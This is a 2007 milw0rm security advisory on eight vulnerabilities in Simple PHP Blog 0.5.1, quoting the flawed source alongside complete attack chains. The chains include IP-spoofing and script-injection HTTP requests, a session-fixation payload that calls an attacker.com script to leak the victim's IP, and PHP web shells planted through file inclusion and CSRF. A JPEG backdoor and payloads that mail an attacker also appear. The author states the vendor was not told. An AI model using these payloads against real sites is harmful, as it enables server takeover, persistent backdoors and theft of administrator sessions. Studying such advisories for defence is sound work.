@@ -1,0 +1,731 @@
+       Title:   Simple PHP Blog (sphpblog) <= 0.5.1 Multiple Vulnerabilities
+      Vendor:   http://sourceforge.net/projects/sphpblog/
+
+    Advisory:   http://acid-root.new.fr/?0:15
+      Author:   DarkFig < gmdarkfig (at) gmail (dot) com >
+
+ Released on:   2007/10/21
+   Changelog:   ----------
+                                                     L   M   H   T
+     Summary:   Ip Spoofing                         [X] [_] [_] [X]
+                Cross Site Scripting                [X] [_] [_] [X]
+                Session Fixation                    [X] [_] [_] [X]
+                mail() CRLF Injection               [X] [_] [_] [_]
+                Local File Inclusion (+CSRF)        [_] [X] [_] [X]
+                File Deletion (+CSRF)               [_] [X] [_] [X]
+                File Upload Vulnerability           [_] [_] [X] [X]
+                Code Execution (+CSRF)              [_] [_] [X] [X]
+
+      Legend:   L - Low risk         M - Medium risk
+                H - High risk        T - Tested
+
+  Risk level:   Medium / High
+         CVE:   ----------
+
+
+
+  I - IP SPOOFING
+
+  The file "scripts/sb_communicate.php" contains the following
+  code: 
+
+  19| function getIP() {
+  20|  if ( !empty ( $_SERVER[ 'HTTP_CLIENT_IP' ] ) ) {
+  21|   	  $ip = $_SERVER[ 'HTTP_CLIENT_IP' ];
+  22|  }
+  23|  else if ( !empty ( $_SERVER[ 'HTTP_X_FORWARDED_FOR' ] ) ) {
+  24|  	  $ip = $_SERVER[ 'HTTP_X_FORWARDED_FOR' ];
+  25|  }
+  26|  else if ( !empty ( $_SERVER[ 'REMOTE_ADDR' ] ) ) {
+  27| 	  $ip = $_SERVER[ 'REMOTE_ADDR' ];
+  28|  }
+  29|  else if ( getenv( "HTTP_CLIENT_IP" ) ) {
+  30|   	  $ip = getenv( "HTTP_CLIENT_IP" );
+  31|  }
+  32|  else if ( getenv( "HTTP_X_FORWARDED_FOR" ) ) {
+  33| 	  $ip = getenv( "HTTP_X_FORWARDED_FOR" );
+  34|  }
+  35|  else if ( getenv( "REMOTE_ADDR") ) {
+  36|   	  $ip = getenv( "REMOTE_ADDR" );
+  37|  }
+  38|  else { 
+  39| 	  $ip = "UNKNOWN";
+  40|  }
+  41|  return( $ip );
+  42|  }
+
+  So, an attacker can spoof his IP, he just have to create
+  an HTTP packet, add a special header, and send it. The
+  HTTP packet will look's like this:
+  
+  GET /index.php HTTP/1.1\r\n
+  Host: localhost\r\n
+  X-Forwarded-For: 127.0.0.1\r\n
+  Connection: keep-alive\r\n\r\n
+  
+  Later, we'll see how to gain the administrator's session
+  id. Even if we got the good session id, there is a
+  protection that "normally" don't permit to be logged in.
+  Let's see a part of the file "scripts/sb_login.php":
+  
+  28| // Check if user is logged in.
+  29| if ( isset( $_SESSION[ 'logged_in' ] ) &&
+    |             $_SESSION[ 'logged_in' ] == 'yes' ) {
+    |
+  30|   if ( $_SESSION[ 'site_path' ] ===
+    |        dirname($_SERVER[ 'PHP_SELF' ]) ) {
+    |
+  31|     if ( $_SESSION[ 'ip' ] === getIP() ) {
+  32|       // User is logged in.
+  33|       return ( true );
+  34|     }
+  35|   }
+  36| }
+  
+  Thanks to the getIP() function, if we know the
+  administrator's IP (later we'll see how to get it easily),
+  we can bypass the third condition.
+
+
+
+  II - CROSS SITE SCRIPTING
+
+  When a guest add a comment, an HTTP packet is sent to
+  "comment_add_cgi.php". Before writing the comment into
+  a file, there is some conditions, the first condition is
+  that the IP sent with the POST method, must be the same
+  as the IP returned by the getIP() function. Let's see
+  the code:
+
+  88| if ($ok) {
+  89| 	// Verify that posted IP and actual IP matches.
+  90| 	if ( getIP() === $_POST['user_ip'] ) {
+  91| 		$ipMatches = true;
+  92| 	} else {
+  93| 		$ipMatches = false;
+  94| 		$ok = false;
+  95| 		$error_message = $lang_string[ 'error_no_match' ];
+  96| 	}
+  97| }
+
+  This is useless, I don't know what the author wanted to
+  do but this can be bypassed easily. After some conditions,
+  the write_comment() function is called:
+  
+  219| $result = write_comment( $_POST[ 'y' ], $_POST[ 'm' ],
+     |          $_POST[ 'entry' ],
+  220| 		$comment_name,
+  221| 		$comment_email,
+  222| 		$comment_url,
+  223| 		$comment_text,
+  224| 		$_POST[ 'user_ip' ],
+  225| 		$moderationFlag,
+  226| 		time() );
+
+  This function is situated in "scripts/sb_comments.php".
+  Let's see the data which will be stored in a file:
+
+  519| // Save the file
+  520| $save_data = array();
+  521| $save_data[ 'VERSION' ] = $sb_info[ 'version' ];
+  522| $save_data[ 'NAME' ] = clean_post_text( $comment_name );
+  523| $save_data[ 'DATE' ] = $comment_date;
+  524| $save_data[ 'CONTENT' ] = sb_parse_url( clean_post_text( $comment_text ) );
+     |
+  525| if ( $comment_email != '' ) {
+  526|   $save_data[ 'EMAIL' ] = clean_post_text( $comment_email );
+  527| }
+     |
+  528| if ( $comment_url != '' ) {
+  529|   $save_data[ 'URL' ] = clean_post_text( $comment_url );
+  530| }
+     |
+  531| $save_data[ 'IP-ADDRESS' ] = $user_ip; // New 0.4.8
+  532| $save_data[ 'MODERATIONFLAG' ] = $hold_flag;
+  533| 
+  534| // Implode the array
+  535| $str = implode_with_keys( $save_data );
+  536| 
+  537| // Save the file
+  538| $result = sb_write_file( $entryFile, $str ); 
+
+  The clean_post_text() function protect against XSS, it
+  also replace a string separator (by its html equivalent)
+  which is used when comment's data are extracted.
+  This function is in the file "scripts/sb_formatting.php":
+
+  13| function clean_post_text( $str ) {
+  14| 	// Cleans post text input.
+  15| 	//
+  16| 	// Strip out and replace pipes with colons. HTML-ize entities.
+  17| 	// Use charset from the language file to make sure we're only
+  18| 	// encoding stuff that needs to be encoded.
+  19| 	//
+  20| 	// This makes entries safe for saving to a file (since the data
+  21| 	// format is pipe delimited.)
+  22| 	global $lang_string;
+  23| 	$str = str_replace( '|', '|', $str );
+  24| 	$str = @htmlspecialchars( $str, ENT_QUOTES, $lang_string[ 'php_charset' ] );
+  25| 
+  26| 	return ( $str );
+  27| }
+
+  The clean_post_text() function isn't applied to the
+  IP address which will be stored in the file. So this
+  can be exploited to conduct XSS attack. The attacker
+  will send an HTTP packet like this one:
+
+  POST /comment_add_cgi.php HTTP/1.1\r\n
+  Host: localhost\r\n
+  Client-IP: <script>alert(666)</script>\r\n
+  Connection: keep-alive\r\n
+  Content-Type: application/x-www-form-urlencoded\r\n
+  Content-Length: 229\r\n\r\n
+  y=07&m=07&entry=entry070727-161718&comment_name=HereMyName
+  &comment_email=&comment_url=&user_ip=<script>alert(666)</script>
+  &style_dropdown=--&comment_text=This+is+an+example+comment.
+  &comment_capcha=571560&submit=%A0Post+Comment%A0\r\n\r\n
+
+  The sender IP address can be only seen by a registered
+  user. So the code sent by the attacker will be executed
+  when a registered user will see the comments page.
+
+
+
+  III - SESSION FIXATION
+
+  In a session fixation attack, the attacker have to set
+  the victim's session id. In our case, the attacker fix
+  the user's session id, the victim which is logged in,
+  will get logged out when the cookie will be set, then
+  if the victim try to log in, the session id will be
+  registered on the server. Let's see a part of the
+  logged_in() function:
+
+  11| function logged_in ( $redirect_to_login, $redirect_to_setup ) {
+  12|         
+  13|   // Turn off URL SIDs.
+  14|   ini_set('url_rewriter.tags','');
+  15|   ini_set('session.use_trans_sid', false);
+  16| 
+  17|   // Init the session.
+  18|   session_set_cookie_params(60*60*24*5);
+  19| 
+  20|   // Check if the user has a client-side cookie.
+  21|   if ( isset( $_COOKIE[ 'sid' ] ) ) {
+  22|     session_id($_COOKIE[ 'sid' ]);
+  23|   }
+  24| 
+  25|   // Start the session.
+  26|   session_start ();
+  27|     
+  28| // Check if user is logged in.
+  29| if ( isset( $_SESSION[ 'logged_in' ] ) &&
+    |             $_SESSION[ 'logged_in' ] == 'yes' ) {
+    |
+  30|   if ( $_SESSION[ 'site_path' ] ===
+    |        dirname($_SERVER[ 'PHP_SELF' ]) ) {
+    |
+  31|     if ( $_SESSION[ 'ip' ] === getIP() ) {
+  32|       // User is logged in.
+  33|       return ( true );
+  34|     }
+  35|   }
+  36| }
+
+  After, the attacker, who knows the session id, just
+  have to use it to be logged in as the victim's account.
+  But in our case, he must also know the victim's IP.
+  I'll demonstrate how to get administrator rights even
+  if the victim has a protection against XSS (NoScript
+  Firefox plugin for example). First, the attacker will
+  fix the victim's session id by setting a cookie to
+  the victim. Then he'll also force the victim's web
+  browser to establish a connexion to a script that
+  will get the victim's IP. Take a look at this schema:
+
+ +----------------------------------------------------------+
+ | The attacker post a comment using the XSS vulnerability. |
+ | The code which will be executed on the client browser    |
+ | will set the "sid" cookie, it will also force the        |
+ | victim's web browser to send an HTTP packet to a script  |
+ | that will mail the victim's IP to the attacker.          |
+ +----------------------------------------------------------+
+ |
+ |    +---------------------------------------------------+
+ +--> | <meta http-equiv=Set-Cookie content=sid=MD5HERE;> |
+      | <img src=http://attacker.com/getip_and_mail.php>  |
+      +---------------------------------------------------+
+                                                          |
+   +-------------------------------------------------+    |
+   | The victim, which is logged in, have to see the | <--+
+   | comments page. After saw it, the victim will be | 
+   | logged out.                                     |
+   +-------------------------------------------------+
+   |
+   |    +------------------------------------------+
+   +--> | The victim try to log in. Now that she's |
+        | logged in, the session id set by the     |
+        | attacker is registered on the server.    |
+        +------------------------------------------+
+                                                   |
+  +--------------------------------------------+   |
+  | Now the attacker just have to send an HTTP |<--+
+  | packet which contains the session id and a |
+  | special header with the victim's IP.       |
+  | The attacker is logged in as the victim's  |
+  | account.                                   |
+  +--------------------------------------------+
+
+  As you can see, even if the victim is protected against
+  XSS, it's always possible to get adminitrator rights with
+  this type of attack, we juste use the "meta" and "img" tags.
+
+
+
+  IV - MAIL() CRLF INJECTION
+
+  User's variables are not checked before be used in the mail()
+  function. The file "comment_add_cgi.php" call the
+  write_comment() function with the following parameters:
+
+  214| $comment_name = sb_stripslashes($_POST['comment_name']);
+  215| $comment_email = sb_stripslashes($_POST['comment_email']);
+  216| $comment_url = sb_stripslashes($_POST['comment_url']);
+  217| $comment_text = sb_stripslashes($_POST['comment_text']);
+  218| 
+  219| $result = write_comment($_POST[ 'y' ],$_POST[ 'm' ],
+     |          $_POST['entry' ],
+  220| 		$comment_name,
+  221| 		$comment_email,
+  222| 		$comment_url,
+  223| 		$comment_text,
+  224| 		$_POST[ 'user_ip' ],
+  225| 		$moderationFlag,
+  226| 		time() );
+
+  Then the function clean_post_text() is applied to $comment_email.
+  But this function doesn't protect against CRLF Injection, this
+  will not replace the \r and \n chars. Take a look at the file
+  "sb_comments.php":
+
+  471| function write_comment($y,$m,$entry,$comment_name,$comment_email
+     |
+  525| if ( $comment_email != '' ) {
+  526|      $save_data[ 'EMAIL' ] = clean_post_text( $comment_email );
+  527| }
+     |
+  584| // Send the Email
+  585| if ( array_key_exists( 'EMAIL', $save_data ) ) {
+  586|   sb_mail( $save_data[ 'EMAIL' ], $blog_config[ 'blog_email' ],
+     |            $subject, $body, false );
+  587| } 
+
+  The goal of the sb_mail() function is to send mass emails.
+  As you can see belows, there is no protection against
+  $save_data[ 'EMAIL' ].
+
+   45| 	function sb_mail ($from, $to, $subject, $body, $text=true, $priority=3) {
+     |
+   69| 	$headers .= 'From: ' . $from . " \r\n";
+   70|  $headers .= 'Reply-To: ' . $from . " \r\n";
+   71|  $headers .= 'Return-Path: ' . $from . " \r\n";
+     |
+   76|  ini_set('sendmail_from', $from);
+   77|  for ( $j=0; $j < count($to_array); $j++ ) {
+   78|  $result = mail( $to_array[$j], sb_stripslashes($subject),
+     |                  sb_stripslashes($body), $headers );
+   79|  }
+   80| ini_restore('sendmail_from');
+
+  So an attacker can perform a CRLF injection attack into the mail()
+  function, it will probably be used by spammers.
+
+
+
+  V - LOCAL FILE INCLUSION (+CSRF)
+
+  There is an LFI vulnerability (admin rights needed)
+  in the file "languages_cgi.php":
+
+  76| 	if ( array_key_exists( 'store_data', $_GET ) ) {
+  77| 	
+  78| 	// Store all the data from language 2
+  79| 	require_once('languages/' . $_GET[ 'lang2' ] . '/strings.php');
+
+  This will require magic_quotes_gpc=Off. Because they use the
+  GET method, there's a CSRF vulnerability too. For each new
+  comments, a new text file is created. The structure of the file
+  like this:
+
+  VERSION|0.4.8
+  |NAME|<my_name>
+  |DATE|1188078694
+  |CONTENT|<my_comment>
+  |EMAIL|<my_email>
+  |IP-ADDRESS|<my_ip_or_xss>
+  |MODERATIONFLAG|H
+
+  Now imagine that an attacker use the XSS vulnerability to post
+  php code and html tags which will make the admin sent an HTTP
+  request to exploit the LFI vuln. The XSS code will look's like
+  this:
+
+  <!--- <?php
+  $handle = fopen('./themes/back.php', 'w+');
+  fwrite($handle, '<?php @eval($_SERVER[HTTP_SHELL]); ?>');
+  fclose($handle);
+  mail('hacker@you.com', 'hey', 'code executed');
+  exit();
+  /* --->
+  <img src=http://<site>/languages_cgi.php?store_data=1&lang2=
+  ../content/07/07/entry070727-161718/comments/comment070825-235134.txt%00>
+  <!--- */
+  ?> --->
+
+  In order to exploit this, the attacker must know where the new
+  file will be created. Let's see the code:
+
+  471|   function write_comment ( $y, $m, $entry, $comment_name,
+     |   $comment_email, $comment_url, $comment_text, $user_ip,
+     |   $hold_flag='', $comment_date=null ) {
+     | 
+  478|     $basedir = 'content/';
+  479|     $dir = $basedir.$y.'/'.$m.'/'.$entry;
+     | 
+  494|     $dir .= '/comments';
+     | 
+  506|     $dir  .= '/';
+     |
+  512|     $stamp = date('ymd-His');
+  513|     if ( $blog_config[ 'blog_enable_gzip_txt' ] ) {
+  514|       $entryFile = $dir.'comment'.$stamp.'.txt.gz';
+  515|     } else {
+  516|       $entryFile = $dir.'comment'.$stamp.'.txt';
+  517|     }
+ 
+  The variables $y, $m and $entry are sent with the HTTP request.
+  The filename is decided with the date() function. There is many
+  ways for know the content returned by $stamp:
+  - Ask the server by sending an HTTP request (the "Date" header).
+  - Bruteforce the path (Add several html tags).
+  - Divide our attack in two parts (filenames are displayed in the html source).
+
+  The attacker must also urlencode the content of his XSS, the
+  HTTP packet will finally look's like this:
+
+  POST /comment_add_cgi.php HTTP/1.1
+  Host: localhost
+  Connection: keep-alive
+  Cookie: PHPSESSID=<SID>
+  Client-IP: <HTML_AND_PHP_CONTENT>
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: <LEN>
+  y=<Y>&m=<M>&entry=<ENTRY>&comment_name=Hacker
+  &comment_email=my%40you.com&comment_url=&user_ip=
+  <HTML_AND_PHP_CONTENT_URLENCODED>
+  &style_dropdown=--&comment_text=Hello&comment_capcha
+  =128619&submit=%A0Post+Comment%A0
+
+  Now the attacker have to wait until the admin see his comment.
+
+
+
+  VI - FILE DELETION (+CSRF)
+
+  There is a CSRF vulnerability which can lead to file
+  deletion. Let's see the code of "trackback_delete_cgi.php":
+
+  22| if ( array_key_exists( 'trackback', $_GET ) ) {
+  23| 	$ok = delete_trackback( $_GET[ 'trackback' ] );	
+  24| }
+
+  So if the variable "trackback" is set with the GET method, 
+  the delete_trackback() function is called. The code of 
+  this function is situated in "sb_trackback.php":
+
+  229| 	function delete_trackback ( $entryFile ) {
+  230| 		// Delete the old file
+  231| 		if ( file_exists( $entryFile ) ) {
+  232| 			$ok = sb_delete_file( $entryFile );
+  233| 		}
+
+  If the file exists, the function sb_delete_file() is called,
+  with the parameter $_GET['trackback']. The source code 
+  of this function is situated in the file "sb_fileio.php":
+
+  171|   function sb_delete_file ( $filename ) {
+     |
+  175|     clearstatcache();
+  176|     if ( file_exists( $filename ) ) {
+  177|       $result = @unlink( $filename );
+  178|     }
+
+  There is no verification before deleting the file. So we
+  can delete any files on the server. The HTTP packet sent
+  by the attacker will look's like this:
+
+  GET /trackback_delete_cgi.php?trackback=<FILE> HTTP/1.1\r\n
+  Host: localhost\r\n
+  Connection: keep-alive\r\n\r\n
+
+  Admin right's are needed to delete files, but because
+  it's also a CRLF vulnerability, we can use it in our XSS,
+  then so admin right's aren't needed for the attacker.
+
+
+
+  VII - FILE UPLOAD VULNERABILITY
+
+  When we're admin, we can upload emoticons.
+  Let'see the content of the function upload_emoticons()
+  which is situated in the file "emoticons.php":
+
+  36| function upload_emoticons() {
+  37| 	// Emoticon upload form results
+  38| 	$path = 'images/emoticons';
+  39| 	$uploaddir = $path;
+  40| 	
+  41| 	$ok = false;
+  42| 	if ( $_FILES[ 'user_emot' ][ 'error' ] == 0 ) {
+  43| 	if (!file_exists($uploaddir)) {
+  44| 		$oldumask = umask(0);
+  45| 		@mkdir($uploaddir, 0777 );
+  46| 		@umask($oldumask);
+  47| 	}
+  48| 		
+  49| 	$uploaddir .= '/';
+  50| 	$uploadfile = $uploaddir.
+    |                 preg_replace("/ /","_",$_FILES[ 'user_emot' ][ 'name' ]);
+  51| 
+  52| 	if (@is_uploaded_file($_FILES['user_emot']['tmp_name'])) {
+    |
+  53| 	if (@getimagesize($_FILES['user_emot']['tmp_name']) == FALSE){
+  54| 		$ok = -1;
+    |
+  55| 	} else {
+    |
+  56| 	if (@move_uploaded_file($_FILES['user_emot']['tmp_name'], $uploadfile)){
+  57| 		chmod( $uploadfile, 0777 );
+  58| 		$ok = true;
+  59| 	}
+
+  As you can see, there is only one protection against file
+  upload vulnerability. The function getimagesize() will
+  return FALSE if the upload file isn't a valid image file.
+  But we can bypass this easily. Take a look at this:
+
+  C:\>edjpgcom img1x1.jpg
+
+  C:\>hexdump img1x1.jpg
+
+  ff d8 ff e0 00 10 4a 46 - 49 46 00 01 01 01 00 60   ......JF IF......
+  00 60 00 00 ff db 00 43 - 00 08 06 06 07 06 05 08   .......C ........
+  07 07 07 09 09 08 0a 0c - 14 0d 0c 0b 0b 0c 19 12   ........ ........
+  13 0f 14 1d 1a 1f 1e 1d - 1a 1c 1c 20 24 2e 27 20   ........ ........
+  22 2c 23 1c 1c 28 37 29 - 2c 30 31 34 34 34 1f 27   ......7. .01444..
+  39 3d 38 32 3c 2e 33 34 - 32 ff db 00 43 01 09 09   9.82..34 2...C...
+  09 0c 0b 0c 18 0d 0d 18 - 32 21 1c 21 32 32 32 32   ........ 2...2222
+  32 32 32 32 32 32 32 32 - 32 32 32 32 32 32 32 32   22222222 22222222
+  32 32 32 32 32 32 32 32 - 32 32 32 32 32 32 32 32   22222222 22222222
+  32 32 32 32 32 32 32 32 - 32 32 32 32 32 32 ff fe   22222222 222222..
+  00 26 3c 3f 70 68 70 20 - 65 76 61 6c 28 24 5f 53   ....php. eval...S
+  45 52 56 45 52 5b 48 54 - 54 50 5f 53 48 45 4c 4c   ERVER.HT TP.SHELL
+  5d 29 3b 20 3f 3e ff c0 - 00 11 08 00 01 00 01 03   ........ ........
+  01 22 00 02 11 01 03 11 - 01 ff c4 00 1f 00 00 01   ........ ........
+  05 01 01 01 01 01 01 00 - 00 00 00 00 00 00 00 01   ........ ........
+  02 03 04 05 06 07 08 09 - 0a 0b ff c4 00 b5 10 00   ........ ........
+  02 01 03 03 02 04 03 05 - 05 04 04 00 00 01 7d 01   ........ ........
+  02 03 00 04 11 05 12 21 - 31 41 06 13 51 61 07 22   ........ 1A..Qa..
+  71 14 32 81 91 a1 08 23 - 42 b1 c1 15 52 d1 f0 24   q.2..... B...R...
+  33 62 72 82 09 0a 16 17 - 18 19 1a 25 26 27 28 29   3br..... ........
+  2a 34 35 36 37 38 39 3a - 43 44 45 46 47 48 49 4a   .456789. CDEFGHIJ
+  53 54 55 56 57 58 59 5a - 63 64 65 66 67 68 69 6a   STUVWXYZ cdefghij
+  73 74 75 76 77 78 79 7a - 83 84 85 86 87 88 89 8a   stuvwxyz ........
+  92 93 94 95 96 97 98 99 - 9a a2 a3 a4 a5 a6 a7 a8   ........ ........
+  a9 aa b2 b3 b4 b5 b6 b7 - b8 b9 ba c2 c3 c4 c5 c6   ........ ........
+  c7 c8 c9 ca d2 d3 d4 d5 - d6 d7 d8 d9 da e1 e2 e3   ........ ........
+  e4 e5 e6 e7 e8 e9 ea f1 - f2 f3 f4 f5 f6 f7 f8 f9   ........ ........
+  fa ff c4 00 1f 01 00 03 - 01 01 01 01 01 01 01 01   ........ ........
+  01 00 00 00 00 00 00 01 - 02 03 04 05 06 07 08 09   ........ ........
+  0a 0b ff c4 00 b5 11 00 - 02 01 02 04 04 03 04 07   ........ ........
+  05 04 04 00 01 02 77 00 - 01 02 03 11 04 05 21 31   ......w. .......1
+  06 12 41 51 07 61 71 13 - 22 32 81 08 14 42 91 a1   ..AQ.aq. .2...B..
+  b1 c1 09 23 33 52 f0 15 - 62 72 d1 0a 16 24 34 e1   ....3R.. br....4.
+  25 f1 17 18 19 1a 26 27 - 28 29 2a 35 36 37 38 39   ........ ...56789
+  3a 43 44 45 46 47 48 49 - 4a 53 54 55 56 57 58 59   .CDEFGHI JSTUVWXY
+  5a 63 64 65 66 67 68 69 - 6a 73 74 75 76 77 78 79   Zcdefghi jstuvwxy
+  7a 82 83 84 85 86 87 88 - 89 8a 92 93 94 95 96 97   z....... ........
+  98 99 9a a2 a3 a4 a5 a6 - a7 a8 a9 aa b2 b3 b4 b5   ........ ........
+  b6 b7 b8 b9 ba c2 c3 c4 - c5 c6 c7 c8 c9 ca d2 d3   ........ ........
+  d4 d5 d6 d7 d8 d9 da e2 - e3 e4 e5 e6 e7 e8 e9 ea   ........ ........
+  f2 f3 f4 f5 f6 f7 f8 f9 - fa ff da 00 0c 03 01 00   ........ ........
+  02 11 03 11 00 3f 00 f7 - fa 28 a2 80 3f ff d9 d9   ........ ........
+
+  C:\>ren img1x1.jpg backdoor.php
+
+  The created file is a valid jpg image, so the check made
+  by the function getimagesize() will be bypassed. And so
+  the backdoor will be uploaded in "images/emoticons".
+
+
+
+  VIII - CODE EXECUTION (+CSRF)
+
+  There is a CSRF vulnerability which can lead to execute
+  PHP code, this is the critical point of this script.
+  Let's see the code of the file "manage_users.php":
+
+   61| if ( $_GET[ 'action' ] == "update" ) {
+     |
+   63|  if ($_SESSION[ 'fulladmin' ] != 'yes' ) {
+   64|         echo($lang_string['fulladminerror']);
+   65| } else {
+   66| 
+   67|   // First read and remove the offending line
+   68|   $pfile = fopen("config/users.php","a+");
+   69|   rewind($pfile);
+     |
+   70|   while (!feof($pfile)) {
+   71|     $line = fgets($pfile);
+   72|     $tmp = explode('|', $line);
+   73| 
+   74|     if ( $_GET[ 'type' ] == "edit" ) {
+   75|       if ( $tmp[1] != $_GET[ 'user' ] )
+     |          { $newfile = $newfile . $line; }
+   76|     } else {
+   77|       $newfile = $newfile . $line;
+   78|     }
+   79|   }
+   80|   fclose($pfile);
+     |
+  101|   $blankfield = "";
+  102| 
+  103|   // Create the record structure
+  104|   if ( $_GET[ 'type' ] == "edit" ) {
+     |
+  107|     $password = $_GET[ 'oldpasshash' ];
+  108|     if ( $password != $_POST[ 'sPassword' ] ) {
+  109|       $password = crypt($_GET[ 'user' ],$_POST[ 'sPassword' ] );
+  110|     }
+  111| 
+  112|     $array =
+     |     array($_POST[ 'sFullname' ], $_GET[ 'user' ], $password,
+     |     $_POST[ 'sAvatar' ], $active, $_POST[ 'sEmail' ],
+     |     $modcomments, $deleteentries, $editany, $blankfield);
+     |
+  113|   } else {
+     |
+  114|     $array =
+     |     array($_POST[ 'sFullname' ], $_POST[ 'sUsername' ],
+     |     crypt( $_POST[ 'sUsername' ], $_POST[ 'sPassword' ] ),
+     |     $_POST[ 'sAvatar' ], $active, $_POST[ 'sEmail' ],
+     |     $modcomments, $deleteentries, $editany, $blankfield);
+  115|   }
+     |
+  116|   $str = implode('|', $array);
+  117|   $newfile = $newfile . $str . "n";
+     |
+  120|   $pfile = fopen("config/users.php","w");
+  121|   fwrite($pfile, $newfile);
+  122|   fclose($pfile);
+  123| 
+  124|   redirect_to_url("manage_users.php");
+  125| }
+  126| }
+
+  As you can see there is no protection against PHP chars 
+  (like strip_tags()) before inserting user's data into
+  the php file. But the author of the script add a ".htaccess"
+  file in the "config" directory. Let's see the content of
+  this file: 
+  
+   1| IndexIgnore *
+   2| 
+   3| <Files .htaccess>
+   4| order allow,deny
+   5| deny from all
+   6| </Files>
+   7| 
+   8| <Files *.txt>
+   9| order allow,deny
+  10| deny from all
+  11| </Files>
+
+  So we can't list the content of the directory, and we
+  don't have access to .htaccess/.txt files. But we can
+  access to .php files ! This require admin rights...
+  but we can write PHP code with the GET method, that's
+  why there's also a CSRF vulnerability. In our example
+  we will take this php code (as you can see we don't
+  need magic_quote_gpc=Off):
+
+   1| <?php
+   2| 
+   3| if(isset($_GET[mail]))
+   4| {
+   5| $mail = <<<MAIL
+   6| hacker@you.com
+   7| MAIL;
+   8| 
+   9| $subject = <<<SUBJ
+  10| Hey !
+  11| SUBJ;
+  12| 
+  13| $body = <<<BODY
+  14| Code executed
+  15| BODY;
+  16| 
+  17| mail($mail,$subject,$body);
+  18| }
+  19| else eval($_SERVER[HTTP_SHELL]);
+  20| 
+  21| ?>
+
+  So the attacker just have to post (using the XSS)
+  something like this:
+
+  <img src=http://<site>/manage_users.php?action=update
+  &type=edit&user=%3C%3Fphp%0D%0A%0D%0Aif%28isset%28%24
+  _GET%5Bmail%5D%29%29%0D%0A%7B%0D%0A%24mail+%3D+%3C%3C
+  %3CMAIL%0D%0Ahacker%40you.com%0D%0AMAIL%3B%0D%0A%0D%0
+  A%24subject+%3D+%3C%3C%3CSUBJ%0D%0AHey+%21%0D%0ASUBJ%
+  3B%0D%0A%0D%0A%24body+%3D+%3C%3C%3CBODY%0D%0ACode+exe
+  cuted%0D%0ABODY%3B%0D%0A%0D%0Amail%28%24mail%2C%24sub
+  ject%2C%24body%29%3B%0D%0A%7D%0D%0Aelse+eval%28%24_SE
+  RVER%5BHTTP_SHELL%5D%29%3B%0D%0A%0D%0A%3F%3E>
+  <!--- Write php code --->
+
+  <img src=http://<site>/config/users.php?mail=1>
+  <!--- mail the attacker --->
+
+  <img src=http://<site>/trackback_delete_cgi.php?track
+  back=MY_COMMENT_FILENAME>
+  <!--- delete the comment --->
+
+  After, he have to wait until the admin see his comment.
+  Then the HTTP request will be sent to the script, and
+  so the PHP code will be written into "config/users.php".
+
+
+
+  IX - END
+  
+  As you can see there's some pretty cool things here:
+ 
+  - [III] We bypass Noscript firefox plugin protection.
+    We don't use any <script> tags.
+
+  - [V] We use a "self inclusion" technique.
+    We use html and php commentary tags which are very
+    useful in our case.
+
+  I didn't contacted the author of the script, but if
+  he keeps himself informed of updates concerning his
+  script, he should correct these vulnerabilities as
+  quickly as possible.
+
+
+  //Greetz: ddx39, berga, wo, overlock[]
+
+# milw0rm.com [2007-10-22]
